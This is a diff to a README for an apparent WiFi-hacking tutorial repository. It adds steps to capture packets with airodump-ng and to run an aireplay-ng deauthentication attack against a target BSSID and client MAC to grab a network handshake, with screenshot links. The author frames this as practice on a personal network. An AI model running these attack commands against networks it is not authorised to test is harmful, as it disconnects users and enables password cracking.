@@ -24,5 +24,9 @@ In my case it's (wlan0).
 chose the network with the name H4CKER which is my personal network.
 <img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2012-19-13.png">
 
-# "airodump-ng --bssid (enter bssid) --channel 3 --write (name file) wlan0" 
+# "airodump-ng --bssid (enter bssid) --channel(enter CH) --write (name file) wlan0" - capture packets in a file 
+* Run a deauthentication attack with"aireplay-ng --deauth 10 -a (target BSSID) -c (target MAC) wlan0 " on another pane to capture network handshake.
 <img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2013-54-18.png">
+
+
+
